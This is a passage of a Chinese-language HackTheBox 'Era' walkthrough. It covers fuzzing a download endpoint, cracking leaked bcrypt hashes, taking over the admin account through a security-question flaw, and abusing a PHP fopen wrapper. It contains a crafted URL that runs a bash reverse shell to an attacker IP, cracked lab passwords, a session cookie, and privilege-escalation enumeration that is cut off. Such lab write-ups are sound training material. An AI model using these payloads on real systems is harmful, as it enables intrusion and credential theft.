class="hljs-symbol">/login.php</span>                                        <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">09</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>   <span class="hljs-number">70</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/logout.php</span>                                       <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">10</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/manage.php</span>  <span class="hljs-operator">-&gt;</span>  login.php                        <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">20</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">3</span>KB <span class="hljs-operator">-</span> <span class="hljs-symbol">/register.php</span>                                     <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">31</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/upload.php</span>  <span class="hljs-operator">-&gt;</span>  login.php   <br></code></pre></td></tr></table></figure>
+
+<p>扫到了一个注册界面，注册账号成功登录，似乎可以上传文件。</p>
+<p><img src="/2025/11/17/HackTheBox-Era/vmware_9nJv1PNyyd.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传文件后给了一个下载链接。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://file.era.htb/download.php?<span class="hljs-built_in">id</span>=7817<br></code></pre></td></tr></table></figure>
+
+<p>注意到有个参数id。</p>
+<p>可能还有其他的文件可以下载，fuzz一下。</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs nix">ffuf <span class="hljs-operator">-</span>u <span class="hljs-string">&quot;http://file.era.htb/download.php?id=FUZZ&quot;</span> <span class="hljs-operator">-</span>w id.txt <span class="hljs-operator">-</span>H &#x27;Cookie:PHPSESSID<span class="hljs-operator">=</span>jufdhn16ovg3aop3qtp2jevmgg&#x27; <span class="hljs-operator">-</span>fw <span class="hljs-number">3161</span><br><br>        <span class="hljs-operator">/</span>&#x27;___\  <span class="hljs-operator">/</span>&#x27;___\           <span class="hljs-operator">/</span>&#x27;___\       <br>       <span class="hljs-operator">/</span>\ \__<span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>\ \__<span class="hljs-symbol">/</span>  __  __  <span class="hljs-operator">/</span>\ \__<span class="hljs-symbol">/</span>       <br>       \ \ ,__\\ \ ,__\<span class="hljs-operator">/</span>\ \<span class="hljs-operator">/</span>\ \ \ \ ,__\      <br>        \ \ \_<span class="hljs-symbol">/</span> \ \ \_<span class="hljs-operator">/</span>\ \ \_\ \ \ \ \_<span class="hljs-symbol">/</span>      <br>         \ \_\   \ \_\  \ \____<span class="hljs-symbol">/</span>  \ \_\       <br>          \<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>    \<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>   \<span class="hljs-operator">/</span>___<span class="hljs-symbol">/</span>    \<span class="hljs-operator">/</span>_<span class="hljs-symbol">/</span>       <br><br>       v2.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span>dev<br>________________________________________________<br><br> :: <span class="hljs-params">Method           :</span> GET<br> :: <span class="hljs-params">URL              :</span> http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-operator">/</span>download.php<span class="hljs-operator">?</span>id<span class="hljs-operator">=</span>FUZZ<br> :: <span class="hljs-params">Wordlist         :</span> <span class="hljs-params">FUZZ:</span> <span class="hljs-symbol">/home/kali/Desktop/id.txt</span><br> :: <span class="hljs-params">Header           :</span> <span class="hljs-params">Cookie:</span> PHPSESSID<span class="hljs-operator">=</span>jufdhn16ovg3aop3qtp2jevmgg<br> :: Follow <span class="hljs-params">redirects :</span> <span class="hljs-literal">false</span><br> :: <span class="hljs-params">Calibration      :</span> <span class="hljs-literal">false</span><br> :: <span class="hljs-params">Timeout          :</span> <span class="hljs-number">10</span><br> :: <span class="hljs-params">Threads          :</span> <span class="hljs-number">40</span><br> :: <span class="hljs-params">Matcher          :</span> Response <span class="hljs-params">status:</span> <span class="hljs-number">20</span>0-<span class="hljs-number">299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span><br> :: <span class="hljs-params">Filter           :</span> Response <span class="hljs-params">words:</span> <span class="hljs-number">3161</span><br>________________________________________________<br><br><span class="hljs-number">54</span>                      [<span class="hljs-params">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-params">Size:</span> <span class="hljs-number">6378</span>, <span class="hljs-params">Words:</span> <span class="hljs-number">2552</span>, <span class="hljs-params">Lines:</span> <span class="hljs-number">222</span>, <span class="hljs-params">Duration:</span> <span class="hljs-number">141</span>ms]<br><span class="hljs-number">150</span>                     [<span class="hljs-params">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-params">Size:</span> <span class="hljs-number">6366</span>, <span class="hljs-params">Words:</span> <span class="hljs-number">2552</span>, <span class="hljs-params">Lines:</span> <span class="hljs-number">222</span>, <span class="hljs-params">Duration:</span> <span class="hljs-number">93</span>ms]<br>:: <span class="hljs-params">Progress:</span> [<span class="hljs-number">1000</span><span class="hljs-operator">/</span><span class="hljs-number">1000</span>] :: Job [<span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">441</span> req<span class="hljs-symbol">/sec</span> :: <span class="hljs-params">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">03</span>] :: <span class="hljs-params">Errors:</span> <span class="hljs-number">0</span> ::<br><br></code></pre></td></tr></table></figure>
+
+<p>访问第54个，发现了可能是网站源码。</p>
+<p><img src="/2025/11/17/HackTheBox-Era/0r9ViDFID9.png" srcset="/img/loading.gif" lazyload></p>
+<p>下载下来发现里面有数据库文件，里面有密码。</p>
+<p><img src="/2025/11/17/HackTheBox-Era/navicat_hNePiOtVRi.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功破解出两个用户的密码。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">john hash.txt <span class="hljs-comment">--wordlist=rockyou.txt    </span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">6</span> <span class="hljs-keyword">password</span> hashes <span class="hljs-keyword">with</span> <span class="hljs-number">6</span> different salts (bcrypt [Blowfish <span class="hljs-number">32</span>/<span class="hljs-number">64</span> X3])<br>Loaded hashes <span class="hljs-keyword">with</span> <span class="hljs-keyword">cost</span> <span class="hljs-number">1</span> (iteration count) <span class="hljs-type">varying</span> <span class="hljs-keyword">from</span> <span class="hljs-number">1024</span> <span class="hljs-keyword">to</span> <span class="hljs-number">4096</span><br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>america          (eric)     <br>mustang          (yuri)     <br><span class="hljs-number">2</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span>:<span class="hljs-number">55</span> <span class="hljs-number">0.03</span>% (ETA: <span class="hljs-number">2025</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">08</span>:<span class="hljs-number">41</span>) <span class="hljs-number">0.01735</span>g/s <span class="hljs-number">47.17</span>p/s <span class="hljs-number">193.6</span>c/s <span class="hljs-number">193.6</span>C/s marias..ilovejack<br>Use the &quot;--show&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> aborted<br><br></code></pre></td></tr></table></figure>
+
+<p>但是登录上去没有文件可以修改，尝试以管理员的身份登录。</p>
+<p><img src="/2025/11/17/HackTheBox-Era/vmware_WKVWGwqCud.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里非常奇怪的是，以A用户的身份登录可以修改B用户的密保问题，利用这一点修改管理员的密保问题。</p>
+<p>成功以管理员的身份登录。</p>
+<p><img src="/2025/11/17/HackTheBox-Era/vmware_vk7ktaRSt8.png" srcset="/img/loading.gif" lazyload></p>
+<p>下载底下的sign文件，发现有个邮箱，不知道有什么用。</p>
+<p><img src="/2025/11/17/HackTheBox-Era/vmware_4JRc6eCdGE.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="GetEric"><a href="#GetEric" class="headerlink" title="GetEric"></a>GetEric</h3><hr>
+<p>之后这一块没想到好的利用点，回去看ftp服务，发现yuri用数据库里的凭证可以登录上去。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ftp</span> <span class="hljs-number">10.10.11.79</span> <br><span class="hljs-attribute">Connected</span> to <span class="hljs-number">10.10.11.79</span>.<br><span class="hljs-attribute">220</span> (vsFTPd <span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5</span>)<br><span class="hljs-attribute">Name</span> (<span class="hljs-number">10.10.11.79</span>:kali): yuri<br><span class="hljs-attribute">331</span> Please specify the password.<br><span class="hljs-attribute">Password</span>: <br><span class="hljs-attribute">230</span> Login successful.<br><span class="hljs-attribute">Remote</span> system type is UNIX.<br><span class="hljs-attribute">Using</span> binary mode to transfer files.<br><span class="hljs-attribute">ftp</span>&gt; ls<br><span class="hljs-attribute">229</span> Entering Extended Passive Mode (|||<span class="hljs-number">62972</span>|)<br><span class="hljs-attribute">150</span> Here comes the directory listing.<br><span class="hljs-attribute">drwxr</span>-xr-x    <span class="hljs-number">2</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">08</span>:<span class="hljs-number">42</span> apache2_conf<br><span class="hljs-attribute">drwxr</span>-xr-x    <span class="hljs-number">3</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">08</span>:<span class="hljs-number">42</span> php8.<span class="hljs-number">1</span>_conf<br></code></pre></td></tr></table></figure>
+
+<p>进到php8.1目录里，发现ssh2服务可用。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl">sh2:<span class="hljs-regexp">//</span><br>ssh2:<span class="hljs-regexp">//</span> — 安全外壳协议 <span class="hljs-number">2</span><br><br>说明<br>ssh2.shell:<span class="hljs-regexp">//</span> ssh2.exec:<span class="hljs-regexp">//</span> ssh2.tunnel:<span class="hljs-regexp">//</span> ssh2.sftp:<span class="hljs-regexp">//</span> ssh2.scp:<span class="hljs-regexp">//</span> (PECL)<br><br>注意: 该封装器默认没有激活<br>为了使用 ssh2.*:<span class="hljs-regexp">//</span> 封装协议，必须从 » PECL 中安装有效的 » SSH2 扩展。<br><br>除了支持传统的 URI 登录信息，ssh2 封装协议也支持通过 URL 的主机（host）部分来复用打开连接。<br><br>用法<br>ssh2.shell:<span class="hljs-regexp">//us</span>er:pass<span class="hljs-variable">@example</span>.com:<span class="hljs-number">22</span>/xterm<br>ssh2.exec:<span class="hljs-regexp">//us</span>er:pass<span class="hljs-variable">@example</span>.com:<span class="hljs-number">22</span>/usr/<span class="hljs-keyword">local</span>/bin/somecmd<br>ssh2.tunnel:<span class="hljs-regexp">//us</span>er:pass<span class="hljs-variable">@example</span>.com:<span class="hljs-number">22</span>/<span class="hljs-number">192.168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">14</span><br>ssh2.sftp:<span class="hljs-regexp">//us</span>er:pass<span class="hljs-variable">@example</span>.com:<span class="hljs-number">22</span>/path/to/filename<br></code></pre></td></tr></table></figure>
+
+<p>同时审计之前的download.php,发现当用户为管理员时，可以控制fopen函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// BETA (Currently only available to the admin) - Showcase file instead of downloading it</span><br>	&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>] === <span class="hljs-string">&quot;true&quot;</span> &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;erauser&#x27;</span>] === <span class="hljs-number">1</span>) &#123;<br>    		<span class="hljs-variable">$format</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;format&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;format&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br>    		<span class="hljs-variable">$file</span> = <span class="hljs-variable">$fetched</span>[<span class="hljs-number">0</span>];<br><br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$format</span>, <span class="hljs-string">&#x27;://&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        		<span class="hljs-variable">$wrapper</span> = <span class="hljs-variable">$format</span>;<br>        		<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>    		&#125; <span class="hljs-keyword">else</span> &#123;<br>        		<span class="hljs-variable">$wrapper</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        		<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html&#x27;</span>);<br>    		&#125;<br><br>    		<span class="hljs-keyword">try</span> &#123;<br>        		<span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$wrapper</span> ? <span class="hljs-variable">$wrapper</span> . <span class="hljs-variable">$file</span> : <span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br>			<span class="hljs-variable">$full_path</span> = <span class="hljs-variable">$wrapper</span> ? <span class="hljs-variable">$wrapper</span> . <span class="hljs-variable">$file</span> : <span class="hljs-variable">$file</span>;<br>			<span class="hljs-comment">// Debug Output</span><br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Opening: &quot;</span> . <span class="hljs-variable">$full_path</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>        		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$file_content</span>;<br>    		&#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error reading file: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    		&#125;<br></code></pre></td></tr></table></figure>
+
+<p>构造payload。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://file.era.htb/download.php?id=<span class="hljs-number">150</span>&amp;show=true&amp;format=ssh2.exec://eric:america@<span class="hljs-number">127.0.0.1:22</span>/bash+-i+%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>+/dev/tcp/<span class="hljs-number">10.10.16.20</span>/<span class="hljs-number">4444</span>+<span class="hljs-number">0</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/17/HackTheBox-Era/vmware_MPpau0AeHK.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr>
+<p>上传pspy64查看进程。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">51</span>:<span class="hljs-number">44</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12568</span>  | /bin/bash -i <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12572</span>  | /usr/sbin/CRON -f -P <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12573</span>  | /usr/sbin/CRON -f -P <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12574</span>  | bash -c /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=???   PID=<span class="hljs-number">12575</span>  | ???<br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12576</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12577</span>  | openssl asn1parse -inform DER -in text_sig_section.bin <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12580</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12578</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12583</span>  | <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12581</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12584</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">04</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12585</span>  | <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">16</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12586</span>  | cat user.txt <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">38</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12589</span>  | /bin/bash -i <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">47</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12591</span>  | ls --color=auto -la <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">57</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12594</span>  | /bin/bash -i <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12603</span>  | /usr/sbin/CRON -f -P <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12604</span>  | /bin/sh -c bash -c &#x27;/root/initiate_monitoring.sh&#x27; &gt;&gt; /opt/AV/periodic-checks/status.log <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12605</span>  | <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12606</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12608</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12607</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12610</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12609</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12611</span>  | grep -oP (?&lt;=UTF8STRING        :)Era Inc. <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12614</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12612</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12615</span>  | /bin/bash /root/initiate_monitoring.sh <br><br></code></pre></td></tr></table></figure>
+
+<p>注意到root非常频繁的执行initiate_monitoring.sh这个任务</p>
+<p>上传linpeas后注意到我们可写一个文件。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir">eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>ls -al<br>total <span class="hljs-number">32</span><br>drwxrwxr-- <span class="hljs-number">2</span> root devs  <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span> .<br>drwxrwxr-- <span class="hljs-number">3</span> root devs  <span class="hljs-number">4096</span> <span class="hljs-title class_">Jul</span> <span class="hljs-number">22</span> <span class="hljs-number">08</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span> ..<br>-rwxrw---- <span class="hljs-number">1</span> root devs <span class="hljs-number">16544</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span> monitor<br>-rw-rw---- <span class="hljs-number">1</span> root devs   <span class="hljs-number">307</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span> status.log<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>id<br>uid=<span class="hljs-number">1000</span>(eric) gid=<span class="hljs-number">1000</span>(eric) groups=<span class="hljs-number">1000</span>(eric),<span class="hljs-number">1001</span>(devs)<br>eric<span class="hljs-variable">@era</span><span 